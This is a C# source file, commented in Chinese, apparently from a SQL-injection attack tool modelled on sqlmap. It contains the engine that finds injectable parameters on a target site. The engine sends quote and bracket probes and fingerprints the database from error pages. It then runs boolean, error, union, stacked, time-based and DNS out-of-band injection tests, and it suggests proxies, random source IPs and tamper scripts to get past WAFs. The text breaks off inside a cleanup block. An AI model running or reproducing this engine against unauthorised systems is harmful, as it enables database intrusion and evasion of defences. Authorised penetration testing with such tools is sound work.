using SuperSQLInjectionV2.Bypass;
using SuperSQLInjectionV2.Models;
using SuperSQLInjectionV2.Models.Data;
using SuperSQLInjectionV2.Models.Detect;
using SuperSQLInjectionV2.Payload;
using SuperSQLInjectionV2.Tools.Http;
using SuperSQLInjectionV2.ViewModels;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;

namespace SuperSQLInjectionV2.Tools.Inject
{
    /// <summary>
    /// 全面对标业界同类工具的注入点检测引擎：
    /// 1. 动态特征分析（3次原始请求建立页面模板）
    /// 2. checkDynParam 参数动态性预检（静态参数跳过基于页面内容的检测技术）
    /// 3. 单引号探针 + 错误信息DBMS指纹，指纹命中后按库过滤用例
    /// 4. 按 B→E→U→S→T→Q 顺序遍历payload用例库（level/risk/dbms/clause/where/ptype矩阵过滤）
    /// 5. 确认即停，构造与后续取数利用流程兼容的注入标记
    /// </summary>
    public static class InjectDetectEngine
    {
        //判定阈值与技术遍历顺序统一收拢到 DetectTuning（调参只改一处）

        /// <summary>Union无信号短路缓存键（边界前缀模板|后缀模板）。不含where/注释符：
        /// 无信号=参数未进SQL解析器，where语义（追加/替换）与注释符（--/#）差异都不可能改变"未执行"结论；
        /// 且Union用例全为where=1而内联全为where=3，带where进键会导致跨技术共享永不命中</summary>
        private static string UnionMissKey(PayloadBoundary boundary)
        {
            return boundary.Prefix + "|" + boundary.Suffix;
        }

        /// <summary>
        /// 国产库语法兼容映射：达梦兼容Oracle、人大金仓/openGauss兼容PostgreSQL。
        /// 用例库无国产库专属用例，过滤/解析用例dbms时按兼容库对待（统一查 DbProfile 注册表）。
        /// </summary>
        private static DBType CompatDb(DBType db)
        {
            return DbProfile.CompatOf(db);
        }

        private class Ctx
        {
            public AppConfig Config = null!;
            public HttpRequest BaseReq = null!;
            public string PName = "";
            public string PValue = "";
            public string Template = "";
            public List<ChangeFeature> Features = new List<ChangeFeature>();
            public HttpResponse OrigResponse = null!;
            public List<DBType> DbCandidates = new List<DBType>();
            public int[] Ptypes = { 1 };
            public bool Dynamic = true;
            public int BaseSec = -1;
            //基线响应抖动（max-min，毫秒）：抖动大时时间类检测增加一轮确认
            public int BaseJitterMs = 0;
            //重查询payload单位延时校准缓存（key=重查询函数标记，value=每[SLEEPTIME]单位实际耗时毫秒，-1=校准失败）
            public Dictionary<string, double> HeavyUnitMs = new Dictionary<string, double>();
            //页面模板自身稳定性：3次原始请求两两ratio均>=0.98视为稳定
            public bool Stable = true;
            //注入位置（Query/BodyForm/Cookie/Header/BodyJson/Uri）与头名称（Place=Header时用）
            public ParamPlace Place = ParamPlace.Query;
            public string HeaderName = "";
            //URI路径段注入时的段序号（0基，非空段计数，与MyTools.GetUriSegments一致）
            public int UriIndex = -1;
            //参数值为base64编码包装（--base64同款）：命中后PValue为解码后原文，标记值把基底值并入普通Encode块，
            //发送期由自动启用的base64encode编码工具在链尾完成base64编码回写
            public bool Base64 = false;
            //WAF拦截统计（检测期经Send发出的请求）：状态码401/403/406/429/501计入拦截，
            //用于「某技术全量被拦截≠无注入」的区分提示
            public int WafSent = 0;
            public int WafBlocked = 0;
            //参数值是否为纯数字（ptype优先排序与invalid-bignum反证共用判定）
            public bool NumericValue;
            //命中后boundary裁剪（sqlmap condBound/condType同款）：注入上下文（引号/括号形态）是注入点属性，
            //首个命中确定boundary后，后续技术只跑该boundary，大幅减少无效发包
            public PayloadBoundary? KnownBoundary = null;
            //命中后clause收敛（sqlmap clauseMatch同款）：WHERE语义（原值后追加/负值替换/整体替换等）同为注入点属性，
            //首个命中记录test.clause后，跳过clause不相交的用例（[0]为通配符不参与收敛）
            public List<int>? KnownClause = null;
            //payload归一化去重（sqlmap seenPayload同款）：随机占位/数字归一后形状相同的请求只发一次
            public HashSet<string> SeenPayloads = new HashSet<string>(StringComparer.Ordinal);
            //Union无信号短路缓存（键=where|boundary前缀模板|后缀模板|comment模板）：
            //某边界全列扫描无任何SQL执行信号（无DB错误页、无列数命中）时，同边界其余字符/列范围/注释用例结论相同，直接短路
            public HashSet<string> UnionNoSignal = new HashSet<string>(StringComparer.Ordinal);
            //页面ratio结果缓存（键=清理后页面文本）：真假值重发/交叉验证常产生产同页面，避免重复相似度计算
            public Dictionary<string, double> RatioCache = new Dictionary<string, double>(StringComparer.Ordinal);
            //模板为JSON时的最小化形态（键序排序+去空白，结构感知比对用）；非JSON为null
            public string? TemplateJson;
            //结构骨架降级（sqlmap pageStructurallyStable同款）：字节不稳定但标签/class/id骨架一致时按骨架比对；null=不启用
            public string? TemplateSkeleton;
            //text-only终极兜底（sqlmap --text-only同款）：骨架也不稳定但纯文本稳定时按纯文本比对；null=不启用
            public string? TemplateTextOnly;
            //时间样本池（前奏顺路收集，EnsureBaseSec复用）：串行段=模板/原页等串行原始请求（干净，优先采用）；
            //并发段=预检并发波请求（互相抬升RunTime，降级兜底）。仅收StatusCode>0的样本（失败/超时请求会毒化max阈值）
            public List<long> SerialTimeSamples = new List<long>();
            public List<long> ConcurrentTimeSamples = new List<long>();
            //WAF停止告警去重（并发波内多个在飞请求可能同时越过拦截阈值，只告警一次；Interlocked.Exchange置位）
            public int WafStopLogged = 0;
            //发包画像：Phase由检测流程各阶段设置，Send/直达请求处埋点计数，检测结束输出分阶段画像日志
            public string Phase = "";
            public Dictionary<string, int> PhaseSent = new Dictionary<string, int>(StringComparer.Ordinal);
        }

        //base64encode临时启用的引用计数门闩（多参数并行检测时，首个base64参数启用、全部结束才还原）
        private static readonly object B64Gate = new object();
        private static int _b64ActiveCount = 0;

        /// <summary>
        /// 对单个参数执行多技术检测，不命中不停：每种技术类型各取一个命中（同类型确认即跳过剩余用例），
        /// 全部技术检测完毕后返回所有命中，列表按利用价值升序排列（最后一个为最优注入点，调用方顺序应用即可）。
        /// place/headerName用于Cookie（level>=2）、User-Agent/Referer等HTTP头（level>=3）、JSON请求体位置的注入检测。
        /// onHit：每确认一个注入点立即回调（发现顺序，非价值排序），调用方据此即时写注入记录；回调来自工作线程，UI侧需自行封送。
        /// </summary>
        public static async Task<List<InjectPoint>> DetectParam(AppConfig config, string requestTxt, string pname, string pvalue,
            ParamPlace place = ParamPlace.Query, string headerName = "", int uriIndex = -1, DetectSessionState? session = null,
            Action<InjectPoint>? onHit = null)
        {
            List<InjectPoint> hits = new List<InjectPoint>();
            Ctx ctx = new Ctx { Config = config, PName = pname, PValue = pvalue ?? "", Place = place, HeaderName = headerName, UriIndex = uriIndex };
            //base64包装参数识别后临时启用base64encode工具（finally中按命中情况还原/保留）
            bool b64TempEnabled = false;
            try
            {
                //base64包装参数识别（--base64同款）：值整体是合法base64且解码后为可打印文本时，
                //检测/取数按「解码→注入→编码回写」流程走——ctx.PValue切换为解码域，标记值整体并入Encode块，
                //并自动启用内置base64encode编码工具（追加到工具列表末尾=链尾执行）完成编码回写
                if (TryDecodeBase64Param(ctx.PValue, out string decodedB64))
                {
                    ctx.Base64 = true;
                    ctx.PValue = decodedB64;
                    //多参数并行下改为引用计数：首个base64参数真正启用工具，其余仅挂计数，全部检测完才还原
                    lock (B64Gate)
                    {
                        if (_b64ActiveCount++ == 0)
                        {
                            b64TempEnabled = Bypass.EncodeToolRegistry.SetEnabled(config, "base64encode", true);
                        }
                    }
                    Log.Show("参数" + pname + "的值为base64编码包装（解码后：'" + (decodedB64.Length > 50 ? decodedB64[..50] + "…" : decodedB64) + "'），已自动启用base64encode编码工具，按解码→注入→编码回写流程检测！");
                }
                int level = Math.Max(1, Math.Min(5, config.DataConfig.DetectLevel));
                int risk = Math.Max(1, Math.Min(3, config.DataConfig.DetectRisk));
                ctx.BaseReq = new HttpRequest(config, requestTxt);

                //1. 动态特征分析：3次原始请求建立页面模板
                //（串行是语义要求：本质是时间维度采样，并发会因广告/秒级时间戳未刷新而漏识别动态块毒化模板）
                ctx.Phase = "模板";
                List<string> pages = new List<string>();
                HttpResponse? firstResp = null;
                long tplStart = Environment.TickCount64;
                for (int i = 0; i < 3; i++)
                {
                    config.CheckStop();
                    HttpResponse tresp = await HTTPTool.SendRequestRetryAsync(new HttpRequest(config, requestTxt)).ConfigureAwait(false);
                    CountPhase(ctx);
                    if (tresp.StatusCode > 0 && tresp.RunTime > 0)
                    {
                        ctx.SerialTimeSamples.Add(tresp.RunTime);
                    }
                    firstResp ??= tresp;
                    pages.Add(tresp.BodyTxt ?? "");
                }
                ctx.Features = WebPageDiffAnalyzer.AnalyzeThreePages(pages[0], pages[1], pages[2]);
                //快目标增强：3次响应原文完全一致且总耗时<1秒时，秒级动态块（时间戳/计数器/广告）可能未翻转被误判为稳定内容，
                //延迟1秒补采第4个样本，有差异则并入动态特征表（只在快目标上多花1秒）
                if (pages[0] == pages[1] && pages[1] == pages[2] && Environment.TickCount64 - tplStart < 1000)
                {
                    await Task.Delay(1000).ConfigureAwait(false);
                    config.CheckStop();
                    HttpResponse t4 = await HTTPTool.SendRequestRetryAsync(new HttpRequest(config, requestTxt)).ConfigureAwait(false);
                    CountPhase(ctx);
                    if (t4.StatusCode > 0 && t4.RunTime > 0)
                    {
                        ctx.SerialTimeSamples.Add(t4.RunTime);
                    }
                    string p4 = t4.BodyTxt ?? "";
                    if (p4 != pages[0])
                    {
                        ctx.Features = WebPageDiffAnalyzer.MergeNewPage(ctx.Features, pages[0], p4);
                        pages.Add(p4);
                        Log.Show("模板补采：目标响应过快（3次采样<1秒且页面一致），延迟补采发现秒级动态内容，已并入动态特征！");
                    }
                }
                ctx.Template = WebPageDiffAnalyzer.ClearDynamicText(ctx.Features, pages[0]);
                //页面稳定性校验（页面不稳定告警）：
                //3次原始请求两两比对，模板自身波动大时布尔/Union的相似度判定不可靠，明确告警而不是静默误报
                double minRatio = 1.0;
                for (int i = 0; i < pages.Count; i++)
                {
                    for (int j = i + 1; j < pages.Count; j++)
                    {
                        string ci = WebPageDiffAnalyzer.ClearDynamicText(ctx.Features, pages[i]);
                        string cj = WebPageDiffAnalyzer.ClearDynamicText(ctx.Features, pages[j]);
                        double r = PageLikeTool.CalculateSimilarity(ci, cj);
                        if (r < minRatio)
                        {
                            minRatio = r;
                        }
                    }
                }
                ctx.Stable = minRatio >= DetectTuning.UpperBound;
                if (!ctx.Stable)
                {
                    //动态特征增量学习（sqlmap findDynamicContent merge同款思路）：页面不稳定时追加2次原始请求，
                    //把新差异区块并入动态特征表后重建模板并重新评估稳定性，提升后续相似度判定可信度
                    for (int i = 0; i < 2; i++)
                    {
                        config.CheckStop();
                        HttpResponse eresp = await HTTPTool.SendRequestRetryAsync(new HttpRequest(config, requestTxt)).ConfigureAwait(false);
                        CountPhase(ctx);
                        if (eresp.StatusCode > 0 && eresp.RunTime > 0)
                        {
                            ctx.SerialTimeSamples.Add(eresp.RunTime);
                        }
                        string extra = eresp.BodyTxt ?? "";
                        ctx.Features = WebPageDiffAnalyzer.MergeNewPage(ctx.Features, pages[0], extra);
                        pages.Add(extra);
                    }
                    ctx.Template = WebPageDiffAnalyzer.ClearDynamicText(ctx.Features, pages[0]);
                    minRatio = 1.0;
                    for (int i = 0; i < pages.Count; i++)
                    {
                        for (int j = i + 1; j < pages.Count; j++)
                        {
                            string ci = WebPageDiffAnalyzer.ClearDynamicText(ctx.Features, pages[i]);
                            string cj = WebPageDiffAnalyzer.ClearDynamicText(ctx.Features, pages[j]);
                            double r = PageLikeTool.CalculateSimilarity(ci, cj);
                            if (r < minRatio)
                            {
                                minRatio = r;
                            }
                        }
                    }
                    ctx.Stable = minRatio >= DetectTuning.UpperBound;
                }
                if (!ctx.Stable)
                {
                    //降级档1（sqlmap pageStructurallyStable同款）：字节不稳定但标签/class/id骨架一致→按结构比对，
                    //动态文本（结果行/广告位）不再干扰判定，结构变化（结果表出现/消失）仍能体现
                    string? skeleton0 = WebPageDiffAnalyzer.ExtractStructuralTokens(pages[0]);
                    if (skeleton0 != null && pages.All(p => WebPageDiffAnalyzer.ExtractStructuralTokens(p) == skeleton0))
                    {
                        ctx.TemplateSkeleton = skeleton0;
                        Log.Show("目标页面字节级不稳定但结构骨架稳定，切换为按页面结构比对（sqlmap structural同款）！");
                    }
                    else
                    {
                        //降级档2（sqlmap --text-only同款）：剥标签比纯文本，纯文本稳定则按文本比对。
                        //注意：模板直接对原文投影、不做清动态——取数侧oracle只能拿到原始页面，
                        //投影必须从原文可复现（骨架提取本就与动态特征无关，此处对齐同一约束）
                        List<string> texts = pages.Select(p => WebPageDiffAnalyzer.GetFilteredPageContent(p)).ToList();
                        double minTextRatio = 1.0;
                        for (int i = 0; i < texts.Count; i++)
                        {
                            for (int j = i + 1; j < texts.Count; j++)
                            {
                                double r = PageLikeTool.CalculateSimilarity(texts[i], texts[j]);
                                if (r < minTextRatio)
                                {
                                    minTextRatio = r;
                                }
                            }
                        }
                        if (minTextRatio >= DetectTuning.UpperBound)
                        {
                            ctx.TemplateTextOnly = texts[0];
                            Log.Show("目标页面结构不稳定但纯文本稳定，切换为text-only比对（sqlmap --text-only同款）！");
                        }
                    }
                }
                if (!ctx.Stable && ctx.TemplateSkeleton == null && ctx.TemplateTextOnly == null)
                {
                    Log.Warning("目标页面内容不稳定（模板内最小相似度" + minRatio.ToString("F4") + " < " + DetectTuning.UpperBound + "），布尔/Union相似度判定可信度下降！建议换稳定页面，或在数据操作页手工指定判断依据（关键字/状态码）。");
                }
                //JSON结构感知比对（sqlmap jsonMinimize同款）：模板为JSON时预计算最小化形态，后续比对键序/空白无关
                ctx.TemplateJson = JsonMinimize(ctx.Template);
                //原页复用：模板建立的首个响应即原始页面（同一请求），不再单独发一次（-1包）
                ctx.OrigResponse = firstResp!;

                //ptype判定前移（纯字符串正则无请求）：动态性/casting探针入波判断依赖它
                ctx.NumericValue = Regex.IsMatch(ctx.PValue, @"^-?\d+(\.\d+)?$");

                //2. 预检并发波A：动态性噪声×1 + 启发式探针×5（' " ) ')) ,）一波并发发出，响应收齐后本地统一判定。
                //并发安全：Send计数器已Interlocked、样本入并发段池（降级使用）；限速语义由BypassPipeline Stage4
                //时间槽预约在管线层兜底——配置延时/限速时波内请求自动串行间隔，不违限
                ctx.Phase = "预检波";
                string probeReq = BuildRequest(ctx, ProbeMarkedValue(ctx));
                string noise = MyTools.RandStr(4).ToLower() + new Random().Next(100, 999);
                var waveA = new List<(string kind, string reqTxt, string payload)>(6) { ("noise", probeReq, noise) };
                foreach (string p in new[] { "'", "\"", ")", "'))", "," })
                {
                    waveA.Add(("probe", probeReq, p));
                }
                List<(string kind, string payload, HttpResponse resp)> resA = await RunPreWave(ctx, waveA).ConfigureAwait(false);

                //动态性双证据判定：噪声请求 + 单引号探针，两证据均"页面未变"才判非动态（噪声2→1省1包，证据强度不变）
                HttpResponse noiseResp = resA[0].resp;
                HttpResponse quoteResp = resA.First(r => r.kind == "probe" && r.payload == "'").resp;
                bool? noiseDyn = EvidenceChanged(ctx, noiseResp, noise);
                bool? quoteDyn = EvidenceChanged(ctx, quoteResp, "'");
                int evKnown = (noiseDyn.HasValue ? 1 : 0) + (quoteDyn.HasValue ? 1 : 0);
                int evUnchanged = (noiseDyn == false ? 1 : 0) + (quoteDyn == false ? 1 : 0);
                //两有效证据均未变→非动态；只有一个有效证据时沿用其结论；证据全无效按动态保守处理（与旧失败路径一致）
                ctx.Dynamic = !(evUnchanged >= 2 || (evKnown == 1 && evUnchanged == 1));
                bool smart = config.DataConfig.SmartMode;
                if (!ctx.Dynamic)
                {
                    if (!smart)
                    {
                        //智能模式关闭：与业界惯例一致，仅提示疑似非动态参数，不跳过任何技术（静态误报由比对算法自身兜底）
                        Log.Show("参数" + pname + "看起来不是动态参数，仍继续全量检测（页面相似度将由各技术用例自行判定）！");
                    }
                    else
                    {
                        Log.Show("智能模式：参数" + pname + "疑似非动态（若启发式探针无错误指纹将跳过页面比对类技术）！");
                    }
                }

                //3. 错误信息DBMS指纹合并：5枚探针响应逐个扫描合并（集合操作，与并发完成顺序无关，结果等价串行）
                HashSet<DBType> probeFound = new HashSet<DBType>();
                foreach ((string kind, string _, HttpResponse resp) in resA)
                {
                    if (kind != "probe")
                    {
                        continue;
                    }
                    foreach (string dbName in InjectTools.ScanDbByError(resp.BodyTxt ?? ""))
                    {
                        DBType pdb = ParseDbName(dbName);
                        if (pdb != DBType.UnKnow)
                        {
                            probeFound.Add(pdb);
                        }
                    }
                }
                ctx.DbCandidates = probeFound.ToList();
                if (ctx.DbCandidates.Count > 0)
                {
                    Log.Show("通过错误信息指纹，数据库可能为：" + string.Join(",", ctx.DbCandidates));
                }
                //跨参数信号共享：错误指纹命中的库发布到会话，后续参数优先测试该库专属用例；
                //会话已有信号时输出复用说明（共享boundary排最前、共享库专属用例优先，未命中自动回退全量）
                if (session != null)
                {
                    foreach (DBType pdb in probeFound)
                    {
                        session.Publish(null, pdb, pname);
                    }
                    if (session.HasSignal && session.SourceParam != pname)
                    {
                        List<DBType> sessDbs = session.Dbs;
                        string shared = (session.Boundary != null ? "注入边界" : "")
                            + (sessDbs.Count > 0 ? (session.Boundary != null ? "+" : "") + "命中库[" + string.Join(",", sessDbs) + "]" : "");
                        Log.Show("跨参数信号共享：复用参数 " + session.SourceParam + " 的" + shared + "，对应用例/边界优先测试，未命中自动回退全量！");
                    }
                }
                //--smart：启发式（动态性+错误指纹）均无任何迹象时的处理（与 smart 语义一致：positive heuristics才深测）
                //Level<3：跳过整个深度检测电池；Level≥3：保留时间盲注/堆叠（不依赖页面回显，静态页面注入的唯一通道），
                //页面比对类技术（Bool/报错/Union/内联/DNS外带）在静态页面上无信号源，跳过
                bool smartBlindOnly = false;
                if (smart && !ctx.Dynamic && ctx.DbCandidates.Count == 0)
                {
                    if (level < 3)
                    {
                        Log.Show("智能模式：参数" + pname + "启发式无任何迹象（非动态+无错误指纹），跳过深度检测！注意：头注入/写入型注入（页面不随参数变化且无报错回显）会被跳过，此类目标请关闭智能模式或用 Level≥3 重测（保留时间/堆叠通道）。");
                        return hits;
                    }
                    smartBlindOnly = true;
                    Log.Show("智能模式：参数" + pname + "启发式无任何迹象（非动态+无错误指纹），Level≥3 保留时间盲注/堆叠检测，跳过页面比对类技术（Bool/报错/Union/内联/DNS外带）！");
                }

                //4. ptype两轮策略（优先排序而非排除，sqlmap intBoundaries同款）：数字值先测数字边界，
                //全部技术无命中后主循环补测引号类边界（NumericValue已在并发波前判定）

                //4b. casting检测（sqlmap heuristicCheckSqlInjection同款）：数字参数算术/浮点两探针（内部并发波B），
                //识别参数被后端强制类型转换（intval/floatval）的场景——此类参数注入可能性极低，明确提示
                if (ctx.NumericValue && ctx.Dynamic)
                {
                    ctx.Phase = "casting";
                    await CheckCasting(ctx).ConfigureAwait(false);
                }

                //5. 按技术顺序遍历用例×边界矩阵（数字值两轮：先数字边界，全部技术无命中再补引号类边界）
                int[][] ptypeRounds = ctx.NumericValue
                    ? new[] { new[] { 1 }, new[] { 2, 3, 4, 5, 8 } }
                    : new[] { new[] { 2, 3, 4, 5, 8 } };
                for (int ptypeRound = 0; ptypeRound < ptypeRounds.Length; ptypeRound++)
                {
                    if (ptypeRound > 0)
                    {
                        if (hits.Count > 0)
                        {
                            break;
                        }
                        Log.Show("数字型边界全部技术未命中，补测引号类边界（后端可能将数字参数引号包裹，如 WHERE id='1'）……");
                    }
                    ctx.Ptypes = ptypeRounds[ptypeRound];
                foreach (int stype in DetectTuning.TechniqueOrder)
                {
                    config.CheckStop();
                    int wafSent0 = ctx.WafSent, wafBlocked0 = ctx.WafBlocked;
                    //智能模式+非动态+无指纹+Level≥3：只保留时间盲注(stype=5)/堆叠(stype=4)，页面比对类技术无信号源直接跳过
                    if (smartBlindOnly && stype != 5 && stype != 4)
                    {
                        Log.Show("智能模式：" + TechniqueName(stype) + "依赖页面回显/比对，静态页面无信号源，跳过！");
                        continue;
                    }
                    List<PayloadTest> tests = InjectPayloadLoader.GetTests(stype, level, risk)
                        .OrderBy(t => t.Level).ThenBy(t => t.Risk).ToList();
                    //extendTests（sqlmap kb.extendTests同款，自动放开）：DBMS已通过错误指纹/布尔探针/前序命中识别后，
                    //该库专属用例不受level/risk上限裁剪（sqlmap为交互询问默认Y，本工具自动启用）；
                    //通用用例与其他库用例仍按level/risk过滤
                    if (ctx.DbCandidates.Count > 0)
                    {
                        List<PayloadTest> extended = InjectPayloadLoader.GetTests(stype, 5, 3)
                            .Where(t => (t.Level > level || t.Risk > risk) && ExtendMatch(t, ctx.DbCandidates))
                            .ToList();
                        if (extended.Count > 0)
                        {
                            tests.AddRange(extended);
                            tests = tests.OrderBy(t => t.Level).ThenBy(t => t.Risk).ToList();
                            Log.Show("已识别数据库（" + string.Join(",", ctx.DbCandidates) + "），" + TechniqueName(stype)
                                + "追加该库专属高Level/Risk用例" + extended.Count + "个（extendTests，不受Level/Risk限制）！");
                        }
                    }
                    //futileUnion/unionExtended（sqlmap同款）：尚无其他技术信号时Union只跑基础列范围（起始列≤10），
                    //大范围矩阵留给有信号目标——列数>10的Union点在无布尔/报错信号的目标上极罕见（穷举模式不裁剪）；
                    //已有信号时列范围翻倍扩展（TryUnion内处理），覆盖大列数目标
                    if (stype == 6 && hits.Count == 0 && !config.DataConfig.DetectExhaustive && tests.Count > 0)
                    {
                        int before = tests.Count;
                        tests = tests.Where(t =>
                        {
                            Match mc = Regex.Match(t.RequestColumns ?? "", @"(\d+)\s*-");
                            return !mc.Success || int.Parse(mc.Groups[1].Value) <= 10;
                        }).ToList();
                        if (tests.Count < before)
                        {
                            Log.Show("无其他技术信号，Union仅跑基础列范围用例（" + tests.Count + "/" + before + "个），大范围矩阵跳过（futileUnion）！");
                        }
                    }
                    else if (stype == 6 && hits.Count > 0)
                    {
                        Log.Show("已有其他技术信号，Union列范围自动翻倍扩展，覆盖大列数目标（unionExtended）！");
                    }
                    if (tests.Count == 0)
                    {
                        continue;
                    }
                    //跨参数信号共享：会话命中库的专属用例优先测试（稳定排序保持组内level/risk序；
                    //优先非限定——未命中则自然走完剩余全量用例，不漏检）
                    if (session != null)
                    {
                        List<DBType> sessDbs = session.Dbs;
                        if (sessDbs.Count > 0)
                        {
                            tests = tests.OrderBy(t => ExtendMatch(t, sessDbs) ? 0 : 1).ToList();
                        }
                    }
                    Log.Show("正在进行" + TechniqueName(stype) + "检测（" + tests.Count + "个用例，Level<=" + level + "，Risk<=" + risk + "）……");
                    ctx.Phase = TechniqueName(stype);
                    //跨技术信号共享跳过计数（本技术内因Union无信号+非动态跳过的组合数）
                    int sharedSkip = 0;
                    foreach (PayloadTest test in tests)
                    {
                        config.CheckStop();
                        if (!DbmsMatch(test, ctx.DbCandidates))
                        {
                            continue;
                        }
                        //命中后clause收敛（sqlmap clauseMatch同款）：已确定WHERE语义的注入点，
                        //跳过clause不相交的用例；任一侧为[0]通配时不裁剪
                        if (ctx.KnownClause != null
                            && !(ctx.KnownClause.Count == 1 && ctx.KnownClause[0] == 0)
                            && !(test.Clause.Count == 1 && test.Clause[0] == 0)
                            && !test.Clause.Intersect(ctx.KnownClause).Any())
                        {
                            continue;
                        }
                        //extendTests同步放开boundary的level上限（sqlmap checks.py:414同款）：
                        //仅对命中已识别库的专属用例生效，通用用例boundary仍按level过滤
                        int effLevel = ExtendMatch(test, ctx.DbCandidates) ? 5 : level;
                        //跨参数信号共享：会话命中boundary排到最前（注入上下文大概率同形态；优先非限定，未命中自然回退全量）
                        foreach (PayloadBoundary boundary in OrderBoundaries(session, MatchBoundaries(test, effLevel, ctx.Ptypes)))
                        {
                            config.CheckStop();
                            //命中后boundary裁剪（sqlmap condBound/condType同款）：注入上下文（引号/括号形态）是注入点属性，
                            //首个命中确定boundary后，后续技术只跑该boundary，大幅减少无效发包
                            if (ctx.KnownBoundary != null && !ReferenceEquals(boundary, ctx.KnownBoundary))
                            {
                                continue;
                            }
                            //用例语义：每个test.where值单独构造payload（1=拼在原值后，2=负值替换，3=整体替换）
                            foreach (int where in test.Where)
                            {
                                if (!boundary.Where.Contains(where))
                                {
                                    continue;
                                }
                                //跨技术信号共享（非动态参数限定）：Union全列扫描已证明此边界SQL未执行（无错误页/列数命中），
                                //而页面从不随参数变化（非动态）意味着回显/比对类技术不可能产生信号——报错/内联直接跳过该边界。
                                //时间/堆叠不跳过：静态页面上延时是唯一可能通道（写入型/头注入仅靠它发现，见非动态开关caveat）；
                                //动态参数不共享：WAF可能单独拦union select导致误判死亡边界，动态参数上内联/报错仍可能独立成立
                                if (!ctx.Dynamic && stype is 2 or 3 && ctx.UnionNoSignal.Contains(UnionMissKey(boundary)))
                                {
                                    sharedSkip++;
                                    continue;
                                }
                                //payload归一化去重（sqlmap seenPayload同款）：字母/数字串归一后形状相同的请求只发一次
                                string dedupKey = stype + "|" + where + "|" + NormalizePayloadKey(boundary.Prefix + "" + test.RequestPayload + "" + test.RequestComment + "" + boundary.Suffix);
                                if (!ctx.SeenPayloads.Add(dedupKey))
                                {
                                    continue;
                                }
                                InjectPoint? hit = await (stype switch
                                {
                                    1 => TryBoolean(ctx, test, boundary, where, false),
                                    2 => TryError(ctx, test, boundary, where),
                                    6 => TryUnion(ctx, test, boundary, where, hits.Count > 0),
                                    4 => TryTime(ctx, test, boundary, where, true),
                                    5 => TryTime(ctx, test, boundary, where, false),
                                    3 => TryBoolean(ctx, test, boundary, where, true),
                                    _ => Task.FromResult<InjectPoint?>(null)
                                }).ConfigureAwait(false);
                                if (hit != null && hit.IsInject)
                                {
                                    //base64包装参数：命中即标注AutoTamper（即时回调消费方需要完整命中信息）
                                    if (ctx.Base64)
                                    {
                                        hit.AutoTamper = "base64encode";
                                    }
                                    hits.Add(hit);
                                    //命中即时回调：发现一个注入点就通知调用方写记录，不等全部技术测完
                                    onHit?.Invoke(hit);
                                    //记录首个命中的boundary，后续技术裁剪到该boundary（注入上下文是注入点属性）
                                    ctx.KnownBoundary ??= boundary;
                                    //跨参数信号共享：命中boundary与命中库发布到会话，后续参数优先复用
                                    session?.Publish(ctx.KnownBoundary, hit.DBType, ctx.PName);
                                    //记录首个命中的clause（WHERE语义），后续用例按clause交集收敛
                                    ctx.KnownClause ??= test.Clause;
                                    //命中后该数据库可信度提升，后续技术的dbms专属用例按命中库过滤
                                    if (hit.DBType != DBType.UnKnow && !ctx.DbCandidates.Contains(hit.DBType))
                                    {
                                        ctx.DbCandidates.Add(hit.DBType);
                                    }
                                    //穷举模式（G2开关）：命中后继续测完其余技术，注入记录给出完整画像；默认命中即跳到下一技术
                                    if (!config.DataConfig.DetectExhaustive)
                                    {
                                        goto NextTechnique;
                                    }
                                    goto NextTest;
                                }
                            }
                        }
                        NextTest:;
                        }
                    NextTechnique:;
                    if (sharedSkip > 0)
                    {
                        Log.Show("跨技术信号共享：" + TechniqueName(stype) + "跳过" + sharedSkip + "个（用例×边界）组合——Union全列扫描已证明对应边界SQL未执行，且参数非动态（页面从不变化），回显/比对类技术不可能产生信号！");
                    }
                    //WAF拦截反馈：该技术发出的请求全部被拦截（401/403/406/429/501）时明确提示「疑似被拦」而非「无注入」
                    int tSent = ctx.WafSent - wafSent0, tBlocked = ctx.WafBlocked - wafBlocked0;
                    if (tSent >= 4 && tBlocked == tSent)
                    {
                        Log.Warning(TechniqueName(stype) + "检测发出的" + tSent + "个请求全部被拦截（HTTP 401/403/406/429/501），疑似 WAF 防护拦截而非不存在注入！建议配置随机UA/随机源IP/代理/请求延时（网络设置-基础配置）/tamper（防护绕过-脚本库）后重测。");
                    }
                }
                }
                //6. DNS外带探测（可选开关，本工具扩展）：不依赖页面响应/延时，payload携带唯一token触发数据库
                //向 token.DNSLog域名 发起DNS解析，平台侧回收确认，可发现无回显无延时的盲注点
                if (config.DataConfig.DetectDnsOob)
                {
                    ctx.Phase = "DNS外带";
                    InjectPoint? dnsHit = await TryDnsOob(ctx, level, risk, session).ConfigureAwait(false);
                    if (dnsHit != null && dnsHit.IsInject)
                    {
                        if (ctx.Base64)
                        {
                            dnsHit.AutoTamper = "base64encode";
                        }
                        hits.Add(dnsHit);
                        onHit?.Invoke(dnsHit);
                        if (dnsHit.DBType != DBType.UnKnow && !ctx.DbCandidates.Contains(dnsHit.DBType))
                        {
                            ctx.DbCandidates.Add(dnsHit.DBType);
                        }
                        //跨参数信号共享：DNS命中库发布到会话
                        session?.Publish(null, dnsHit.DBType, ctx.PName);
                    }
                }
                //按利用价值升序：调用方顺序应用后，最优注入点（Union>报错>布尔>时间）成为当前生效配置
                //（base64包装参数的AutoTamper已在命中时逐点标注，注入记录持久化后恢复记录取数自动启用编码回写）
                return hits.OrderBy(ExploitPriority).ToList();
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (SuperSQLInjectionV2.Tools.Http.TargetUnreachableException tue)
            {
                //目标不可达：记日志后上抛，由外层终止当前目标剩余参数的检测（批量模式跳到下一目标）
                Log.Error("目标主机无法连接，终止本次注入检测！" + tue.Message);
                throw;
            }
            catch (Exception e)
            {
                Log.Error("检测引擎异常：" + e.Message);
            }
            finally
            {
                //发包画像：分阶段计数输出（前奏优化收益的量化验证依据；异常中断时也输出已发部分）
                if (ctx.PhaseSent.Count > 0)
                {
                    int totalReqs;
                    string detail;
                    lock (ctx.PhaseSent)
                    {
                        totalReqs = ctx.PhaseSent.Values.Sum();
                        detail = string.Join(" | ", ctx.PhaseSent.Select(kv => kv.Key + "=" + kv.Value));
                    }
                    Log.Show("参数" + ctx.PName + "发包画像：" + detail + " | 合计=" + totalReqs);
                }
                //base64encode为检测期临时启用（引用计数）：最后一个base64参数检测完且无base64命中时还原，
                //避免污染同会话后续参数的检测；有命中时保持启用（取数链路依赖，恢复注入记录的AutoTamper机制会再次确保）
                if (ctx.Base64)
                {
                    lock (B64Gate)
                    {
                        _b64ActiveCount--;
